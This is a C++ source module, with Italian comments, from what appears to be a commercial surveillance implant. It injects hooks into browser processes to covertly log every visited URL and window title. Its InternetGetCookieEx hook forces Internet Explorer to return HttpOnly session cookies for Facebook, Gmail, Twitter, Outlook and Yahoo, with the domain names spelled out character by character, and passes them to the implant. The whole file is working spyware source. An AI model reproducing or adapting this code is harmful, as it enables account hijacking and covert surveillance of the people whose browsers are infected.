#include <mshtml.h>
#include <oleacc.h>
#include <new>
#include "ISimpleDOMDocument.h"

#define MAXURLLEN 1024
#define MAXURLTITLELEN 256
BOOL bPM_UrlLogStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
WCHAR last_url[MAXURLLEN+2];
WCHAR last_window_title[MAXURLTITLELEN+2];
LPFNOBJECTFROMLRESULT pfObjectFromLresult = NULL;
BOOL m_url_found = FALSE;
#define URL_LOG_VER 0x20100713

typedef BOOL (WINAPI *IsWindow_t) (HWND);
typedef struct {
	COMMONDATA;
	IsWindow_t pIsWindow;
#define BROWSER_UNKNOWN      0x00000000
#define BROWSER_IE           0x00000001
#define BROWSER_MOZILLA      0x00000002
#define BROWSER_OPERA		 0x00000003
#define BROWSER_CHROME		 0x00000005
#define BROWSER_TYPE_MASK    0x3FFFFFFF
#define BROWSER_SETTITLE     0x80000000
	DWORD browser_type;
} SendMessageURLStruct;
SendMessageURLStruct SendMessageURLData;

typedef struct {
	DWORD browser_type;
	HWND browser_window;
	DWORD reason;
	WCHAR title[MAXURLTITLELEN+1];
} UrlLogParamsStruct;

typedef struct _url_conf {
	DWORD tag;
	BOOL capture_screen;
} url_conf;

LRESULT __stdcall PM_SendMessageURL(HWND hWnd,
								    UINT Msg,
								    WPARAM wParam,
								    LPARAM lParam)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(SendMessageURLStruct)
	CALL_ORIGINAL_API(4)

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_URLLOG);
	// Controlla se il monitor e' attivo e se la funzione e' andata a buon fine
	if (!Active || !(*Active) || !ret_code)
		return ret_code;

	if (Msg == WM_SETTEXT && pData->pIsWindow(hWnd)) 
		pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)&hWnd, 4, pData->browser_type | BROWSER_SETTITLE, IPC_DEF_PRIORITY);
			
	return ret_code;
}

DWORD PM_SendMessageURL_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE h_usr;

	// Verifica autonomamente se si tratta del processo firefox
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (stricmp(proc_name, "firefox.exe") && stricmp(proc_name, "iexplore.exe") && stricmp(proc_name, "chrome.exe") && stricmp(proc_name, "tbb-firefox.exe"))
			return 1; // Hooka solo firefox e iexplorer
	} else
		return 1;

	if (!stricmp(proc_name, "firefox.exe"))
		SendMessageURLData.browser_type = BROWSER_MOZILLA;
	else if (!stricmp(proc_name, "iexplore.exe"))
		SendMessageURLData.browser_type = BROWSER_IE;
	else if (!stricmp(proc_name, "chrome.exe"))
		SendMessageURLData.browser_type = BROWSER_CHROME;
	else
		SendMessageURLData.browser_type = BROWSER_UNKNOWN;

	VALIDPTR(h_usr = LoadLibrary("User32.dll"));
	VALIDPTR(SendMessageURLData.pIsWindow = (IsWindow_t)HM_SafeGetProcAddress(h_usr, "IsWindow"));
	SendMessageURLData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	SendMessageURLData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	SendMessageURLData.dwHookLen = 800;
	return 0;
}


BOOL __stdcall PM_SetWindowText(HWND hWnd,
								BYTE *text)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(SendMessageURLStruct)
	CALL_ORIGINAL_API(2)

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_URLLOG);
	// Controlla se il monitor e' attivo e se la funzione e' andata a buon fine
	if (!Active || !(*Active) || !ret_code)
		return ret_code;

	if ( pData->pIsWindow(hWnd))
		pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)&hWnd, 4, pData->browser_type | BROWSER_SETTITLE, IPC_DEF_PRIORITY);
			
	return ret_code;
}

DWORD PM_SetWindowText_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE h_usr;

	// Verifica autonomamente se si tratta del processo ie
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (stricmp(proc_name, "opera.exe") && stricmp(proc_name, "chrome.exe") && stricmp(proc_name, "iexplore.exe"))
			return 1; // Hooka solo opera
	} else
		return 1;

	if (!stricmp(proc_name, "opera.exe"))
		SendMessageURLData.browser_type = BROWSER_OPERA;
	else if (!stricmp(proc_name, "chrome.exe"))
		SendMessageURLData.browser_type = BROWSER_CHROME;
	else if (!stricmp(proc_name, "iexplore.exe"))
		SendMessageURLData.browser_type = BROWSER_IE;
	else
		SendMessageURLData.browser_type = BROWSER_UNKNOWN;

	VALIDPTR(h_usr = LoadLibrary("User32.dll"));
	VALIDPTR(SendMessageURLData.pIsWindow = (IsWindow_t)HM_SafeGetProcAddress(h_usr, "IsWindow"));
	SendMessageURLData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	SendMessageURLData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	SendMessageURLData.dwHookLen = 800;
	return 0;
}


void WriteLogURL(WCHAR *url, UrlLogParamsStruct *pUrlLogParams, BOOL check_url)
{
	BYTE url_buffer[sizeof(url_info_struct)+MAXURLLEN*sizeof(WCHAR)];
	url_info_struct *url_info = (url_info_struct *)url_buffer;
	url_info->uBrowserType = pUrlLogParams->browser_type;

	if (!url)
		return;

	// Logghiamo solo i protocolli interessanti
	if (check_url && wcsnicmp(url, L"http", 4) && wcsnicmp(url, L"ftp", 3))
		return;

	_snwprintf_s(url_info->url_name, MAXURLLEN, _TRUNCATE, L"%s", url);

	if (!wcsncmp(last_url, url, MAXURLLEN) && !wcsncmp(last_window_title, pUrlLogParams->title, MAXURLTITLELEN))
		return;

	// In opera viene triggerato piu' volte. Se il titolo e' uguale o l'url e' uguale, allora e' una
	// transizione di pagina
	if (pUrlLogParams->browser_type == BROWSER_OPERA) {
		if (!wcsncmp(last_url, url, MAXURLLEN) || !wcsncmp(last_window_title, pUrlLogParams->title, MAXURLTITLELEN))
			return;
	}

	_snwprintf_s(last_url, MAXURLLEN, _TRUNCATE, L"%s", url);
	_snwprintf_s(last_window_title, MAXURLTITLELEN, _TRUNCATE, L"%s", pUrlLogParams->title);

	// Costruisce e scrive il log sequenziale
	bin_buf tolog;
	struct tm tstamp;
	DWORD delimiter = ELEM_DELIMITER;
	DWORD log_ver = URL_LOG_VER;
	GET_TIME(tstamp);
	tolog.add(&tstamp, sizeof(tstamp));
	tolog.add(&log_ver, sizeof(DWORD));
	tolog.add(url_info->url_name, (wcslen(url_info->url_name)+1)*sizeof(WCHAR));
	tolog.add(&(pUrlLogParams->browser_type), sizeof(DWORD));
	tolog.add(pUrlLogParams->title, (wcslen(pUrlLogParams->title)+1)*sizeof(WCHAR));
	tolog.add(&delimiter, sizeof(DWORD));
	LOG_ReportLog(PM_URLLOG, tolog.get_buf(), tolog.get_len());
}

BOOL isURL(WCHAR *url)
{
	WCHAR *ptr;
	ptr = wcschr(url, L'.');
	if (!ptr)
		return FALSE;
	ptr++;
	if ((*ptr) == 0 || (*ptr) == L'.')
		return FALSE;
	ptr++;
	if (!wcschr(ptr, L'.') && !wcschr(ptr, L'//')) 
		return FALSE;

	return TRUE;
}

void URLOleWalk(IAccessible* iAcc, UrlLogParamsStruct *pUrlLogParams, int deep)
{
	HRESULT hr;
	VARIANT vChild;
	BSTR val;
	LONG childCount, returnCount;

	if (iAcc == NULL || m_url_found == TRUE || deep >= 100)
		return;

	vChild.vt = VT_I4;
	vChild.lVal = CHILDID_SELF;
	
	if (iAcc->get_accValue(vChild, &val) == S_OK) {
		if (val) {
			if (!wcsncmp(val, L"http", wcslen(L"http")) || (pUrlLogParams->browser_type == BROWSER_OPERA && isURL(val)) || (pUrlLogParams->browser_type == BROWSER_CHROME && isURL(val))) {
				WriteLogURL(val, pUrlLogParams, FALSE);
				m_url_found = TRUE;
				SysFreeString(val);
				return;
			}
		}
		SysFreeString(val);
	}

	if (iAcc->get_accChildCount(&childCount) != S_OK)
		return;

	VARIANT* pArray = new(std::nothrow) VARIANT[childCount];
	if (!pArray)
		return;

	hr = FNC(AccessibleChildren)(iAcc, 0L, childCount, pArray, &returnCount);
	if (FAILED(hr)) {
		delete pArray;
		return;
	}

	for(int x = 0; x < returnCount; x++){
		VARIANT vtChild = pArray[x];

		if (vtChild.vt == VT_DISPATCH) {
			IDispatch* pDisp = vtChild.pdispVal;
			IAccessible* pChild = NULL;

			hr = pDisp->QueryInterface(IID_IAccessible, (void**) &pChild);

			if(hr == S_OK) {
				// recurse
				URLOleWalk(pChild, pUrlLogParams, deep+1);
				pChild->Release();
			}
		} 
	}

	for(int i = 0; i < returnCount; i++)
		VariantClear(&pArray[i]);

	if(pArray)
		delete pArray;
}


BOOL CALLBACK URLEnumChildProc(HWND hwnd,LPARAM pUrlLogParams)
{
	WCHAR buf[100];
	BSTR url=NULL, doctype=NULL, title=NULL;
	HRESULT hr;

	if (FNC(GetClassNameW)( hwnd, (LPWSTR)&buf, sizeof(buf)/sizeof(buf[0]) ) == 0)
		return TRUE;
	if ( wcscmp( buf, L"Internet Explorer_Server" ) == 0) {
		IHTMLDocument2 *spDoc = NULL;
		LRESULT lRes;
		UINT nMsg;
		
		if ( !pfObjectFromLresult )
			return FALSE;

		nMsg = FNC(RegisterWindowMessageW)( L"WM_HTML_GETOBJECT" );
		if ( !HM_SafeSendMessageTimeoutW( hwnd, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes ) )
			return FALSE;

		hr = (*pfObjectFromLresult)( lRes, IID_IHTMLDocument2, 0, reinterpret_cast<LPVOID *>(&spDoc) );
		if ( SUCCEEDED(hr) && spDoc != NULL ) {
			// Verifica che sia veramente quella attiva
			hr = spDoc->get_title(&title);
			if (SUCCEEDED(hr)) {
				if (wcsncmp((WCHAR *)title, ((UrlLogParamsStruct *)pUrlLogParams)->title, wcslen((WCHAR *)title))) {
					if (title)
						SysFreeString(title);
					spDoc->Release();
					return TRUE;
				}
				if (title)
					SysFreeString(title);
			}

			hr = spDoc->get_URL(&url);
			if (SUCCEEDED(hr)) {
				WriteLogURL(url, (UrlLogParamsStruct *)pUrlLogParams, TRUE);
				if (url)
					SysFreeString(url);
			}
			spDoc->Release();		
		}
		return FALSE;

	} else if ( wcscmp( buf, L"MozillaWindowClass" ) == 0 ) {
		IAccessible *pAccessible = NULL; 
		IServiceProvider *pServProv = NULL; 
		ISimpleDOMDocument *pSimpleDOMDocument = NULL; 
		BOOL ret_val = TRUE;

		hr = FNC(AccessibleObjectFromWindow)(hwnd, OBJID_CLIENT, IID_IAccessible,(void**)&pAccessible); 
		if (SUCCEEDED(hr) && pAccessible != NULL) { 
			pAccessible->QueryInterface(IID_IServiceProvider,(void**)&pServProv); 
			if (pServProv) { 
				const GUID refguid = {0x0c539790, 0x12e4, 0x11cf, 0xb6, 0x61, 0x00, 0xaa, 0x00, 0x4c, 0xd6, 0xd8}; 
				hr = pServProv->QueryService(refguid, IID_ISimpleDOMDocument, (void**)&pSimpleDOMDocument); 
				if (SUCCEEDED(hr) && pSimpleDOMDocument != NULL) { 
					hr = pSimpleDOMDocument->get_URL(&url);
					if (SUCCEEDED(hr)) {
						hr = pSimpleDOMDocument->get_docType(&doctype);
						if (!SUCCEEDED(hr)) 
							doctype = NULL;
						if (!doctype || wcscmp(doctype, L"window")) {
							WriteLogURL(url, (UrlLogParamsStruct *)pUrlLogParams, TRUE);
							ret_val = FALSE;
						}
						if (doctype)
							SysFreeString(doctype);
						if (url)
							SysFreeString(url);
					}
					pSimpleDOMDocument->Release();
				} 
				pServProv->Release();
			}   
			pAccessible->Release();
		}
		// Se ha trovato un URL (firefox fino al 3) non continua a cercare
		if (!ret_val)
			return ret_val;
	} 
	// Per Chrome, Opera o Firefox4
	if ( wcscmp(buf, L"OpWindow")==0 || wcscmp(buf, L"OperaWindowClass")==0 || wcsncmp(buf, L"Chrome", wcslen(L"Chrome"))==0 || wcscmp( buf, L"MozillaWindowClass" )==0) {
		IAccessible *iAcc = NULL; 
		m_url_found = FALSE; // Serve come semaforo per far fermare le funzioni ricorsive
		hr = FNC(AccessibleObjectFromWindow)(hwnd, OBJID_WINDOW, IID_IAccessible,(void**)&iAcc); 
		if (SUCCEEDED(hr) && iAcc != NULL) { 
			URLOleWalk(iAcc, (UrlLogParamsStruct *)pUrlLogParams, 0);
			iAcc->Release();
			return !m_url_found;
		}
		return TRUE;
	} else
		return TRUE;// continua a cercare...
		
}

void GetURLBarContent(HWND hWnd, DWORD browser_type) 
{
	UrlLogParamsStruct UrlLogParams;

	if (!hWnd)
		return;
	UrlLogParams.browser_type = browser_type & BROWSER_TYPE_MASK;
	UrlLogParams.reason = browser_type & (~BROWSER_TYPE_MASK);
	UrlLogParams.browser_window = hWnd;
	memset(UrlLogParams.title, 0, sizeof(UrlLogParams.title));
	HM_SafeGetWindowTextW(UrlLogParams.browser_window, UrlLogParams.title, MAXURLTITLELEN);

	CoInitialize( NULL );
	// Se non lo trova sulla finestra radice, allora cerca sui figli
	if (URLEnumChildProc(hWnd, (LPARAM)&UrlLogParams))
		FNC(EnumChildWindows)(hWnd, URLEnumChildProc, (LPARAM)&UrlLogParams); 
	CoUninitialize();
}			



typedef WCHAR * (WINAPI *StrStrW_t) (WCHAR *, WCHAR *);
#define MAX_COOKIE_SIZE 2048
typedef struct {
	COMMONDATA;
	WCHAR local_cookie[MAX_COOKIE_SIZE];
	StrStrW_t pStrStrW;
} InternetGetCookieExStruct;
InternetGetCookieExStruct InternetGetCookieExData;

#define WCSLEN(x,y) { y=0; for(;x[y];y++);}
#define COOKIE_IEXPLORER 0x0F000000
#define COOKIE_FACEBOOK 0x100
#define COOKIE_TWITTER 0x200
#define COOKIE_GMAIL 0x300
#define COOKIE_OUTLOOK 0x400
#define COOKIE_YAHOO 0x500


#define COOKIE_MASK 0xFFFF
BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, LPCWSTR lpszCookieData, LPDWORD lpdwSize, DWORD dwFlags, DWORD_PTR dwReserved)
{
	DWORD ret_code;
	DWORD name_len;
	DWORD origin;
	DWORD old_flags;
	DWORD old_size;
	WCHAR *old_buffer;
	WCHAR *old_cname;
	
	MARK_HOOK
	INIT_WRAPPER(InternetGetCookieExStruct)

	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
	WCHAR outlook_url[] = { L'l', L'i', L'v', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
	WCHAR yahoo_url[] = { L'm', L'a', L'i', L'l', L'.', L'y', L'a', L'h', L'o', L'o', L'.', L'c', L'o', L'm', L'/', 0 };

	DWORD local_size = MAX_COOKIE_SIZE-1;
	WCHAR *local_cookie;
	char *local_cookie_char;
	DWORD i;

	// Cerca di capire se si tratta di un dominio interessante
	local_cookie = pData->local_cookie;
	origin = COOKIE_IEXPLORER;
	if (pData->pStrStrW && lpszCookieData && lpszURL && lpdwSize) {
		if (pData->pStrStrW((WCHAR *)lpszURL, facebook_url))
			origin |= COOKIE_FACEBOOK;
		else if (pData->pStrStrW((WCHAR *)lpszURL, gmail_url))
			origin |= COOKIE_GMAIL;
		else if (pData->pStrStrW((WCHAR *)lpszURL, twitter_url))
			origin |= COOKIE_TWITTER;
		else if (pData->pStrStrW((WCHAR *)lpszURL, outlook_url))
			origin |= COOKIE_OUTLOOK;
		else if (pData->pStrStrW((WCHAR *)lpszURL, yahoo_url))
			origin |= COOKIE_YAHOO;

	}
	if (!(origin & COOKIE_MASK)) {
		CALL_ORIGINAL_API_SEQ(6)
		return ret_code;
	}

	// Modifica il flag per prendere i cookie HTTPOnly
	__asm {
		PUSH EAX
		MOV EAX, DWORD PTR [EBP+0x18]
		MOV [old_flags], EAX
		MOV EAX, DWORD PTR [EBP+0x14]
		MOV [old_size], EAX
		MOV EAX, DWORD PTR [EBP+0x10]
		MOV [old_buffer], EAX
		MOV EAX, DWORD PTR [EBP+0x0C]
		MOV [old_cname], EAX

		MOV EAX, 0x00002000
		MOV DWORD PTR [EBP+0x18], EAX
		LEA EAX, local_size
		MOV DWORD PTR [EBP+0x14], EAX
		MOV EAX, local_cookie
		MOV DWORD PTR [EBP+0x10], EAX
		XOR EAX, EAX
		MOV DWORD PTR [EBP+0x0C], EAX

		POP EAX
	}

	local_cookie[0] = 0;

	CALL_ORIGINAL_API_SEQ(6)

	if (ret_code) {
		if (local_cookie[0] != 0) {
			// Toglie gli zeri 
			local_cookie_char = (char *)local_cookie;
			for (i=0; local_cookie[i]; i++)
				local_cookie_char[i] = (char)local_cookie[i];
			local_cookie_char[i] = 0;

			WCSLEN(local_cookie_char, name_len);
			if (name_len > 0) {
				name_len++;
				// Spero che tagliando rimanga la parte importante di cookie...
				if (name_len > MAX_MSG_LEN)
					name_len = MAX_MSG_LEN;
				pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)local_cookie_char, name_len, origin, IPC_DEF_PRIORITY);
			}
		}
	}

	// Rimette i parametri originali e richiama la funzione
	__asm {
		PUSH EAX

		MOV EAX, [old_flags]
		MOV DWORD PTR [EBP+0x18], EAX
		MOV EAX, [old_size]
		MOV DWORD PTR [EBP+0x14], EAX
		MOV EAX, [old_buffer]
		MOV DWORD PTR [EBP+0x10], EAX
		MOV EAX, [old_cname]
		MOV DWORD PTR [EBP+0x0C], EAX

		POP EAX
	}
	CALL_ORIGINAL_API_SEQ(6)
	return ret_code;
}

DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (stricmp(proc_name, "iexplore.exe"))
			return 1; // Hooka solo iexplorer
	} else
		return 1;

	VALIDPTR(hMod = LoadLibrary("Shlwapi.dll"))
	VALIDPTR(InternetGetCookieExData.pStrStrW = (StrStrW_t) HM_SafeGetProcAddress(hMod, "StrStrW"))

	ZeroMemory(InternetGetCookieExData.local_cookie, sizeof(InternetGetCookieExData.local_cookie));
	InternetGetCookieExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	InternetGetCookieExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	InternetGetCookieExData.dwHookLen = 1000;
	return 0;
}


DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
{
	DWORD origin = COOKIE_MASK;
	DWORD size = sizeof(FACEBOOK_IE_COOKIE)-sizeof(char);
	origin = dwFlags & (~origin);

	if (dwLen < 4)
		return 1;

	if (origin == COOKIE_IEXPLORER) {
		origin = dwFlags & COOKIE_MASK;
		if (size > dwLen)
			size = dwLen;

		if (origin == COOKIE_FACEBOOK) {
			ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));	
			memcpy(FACEBOOK_IE_COOKIE, msg, size);

		} else if (origin == COOKIE_TWITTER) {
			ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
			memcpy(TWITTER_IE_COOKIE, msg, size);

		} else if (origin == COOKIE_GMAIL) {
			ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
			memcpy(GMAIL_IE_COOKIE, msg, size);

		} else if (origin == COOKIE_OUTLOOK) {
			ZeroMemory(OUTLOOK_IE_COOKIE, sizeof(OUTLOOK_IE_COOKIE));
			memcpy(OUTLOOK_IE_COOKIE, msg, size);

		} else if (origin == COOKIE_YAHOO) {
			ZeroMemory(YAHOO_IE_COOKIE, sizeof(YAHOO_IE_COOKIE));
			memcpy(YAHOO_IE_COOKIE, msg, size);
		} 

		return 1;
	}

	GetURLBarContent(*((HWND *)msg), dwFlags);		
	return 1;
}


DWORD __stdcall PM_UrlLogStartStop(BOOL bStartFlag, BOOL bReset)
{
	// Lo fa per prima cosa, anche se e' gia' in quello stato
	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
	// che li mette in stop non verrebbero fermati realmente a causa del check
	// if (bPM_KeyLogStarted == bStartFlag) che considera suspended e stopped uguali.
	// Gli agenti IPC non vengono stoppati quando in suspend (cosi' cmq mettono in coda
	// durante la sync).
	if (bReset)
		AM_IPCAgentStartStop(PM_URLLOG, bStartFlag);

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_UrlLogStarted == bStartFlag)
		return 0;

	// I log va inizializzato come prima cosa...
	if (bStartFlag) {
		if (!LOG_InitAgentLog(PM_URLLOG))
			return 0;
		// Se non ha ancora la funzione, la alloca
		if (!pfObjectFromLresult) {
			HINSTANCE hInst = LoadLibrary("OLEACC.DLL");
			pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)HM_SafeGetProcAddress( hInst, "ObjectFromLresult" );
		}
	}

	// bStartFlag e' TRUE se il monitor deve essere attivato
	bPM_UrlLogStarted = bStartFlag;

	// ...e va chiuso come ultima
	if (!bStartFlag)
		LOG_StopAgentLog(PM_URLLOG);
		
	return 1;
}


DWORD __stdcall PM_UrlLogInit(JSONObject elem)
{
	ZeroMemory(last_url, sizeof(last_url));
	ZeroMemory(last_window_title, sizeof(last_window_title));
	return 1;
}


void PM_UrlLogRegister()
{
	AM_MonitorRegister(L"url", PM_URLLOG, (BYTE *)PM_UrlLogDispatch, (BYTE *)PM_UrlLogStartStop, (BYTE *)PM_UrlLogInit, NULL);
}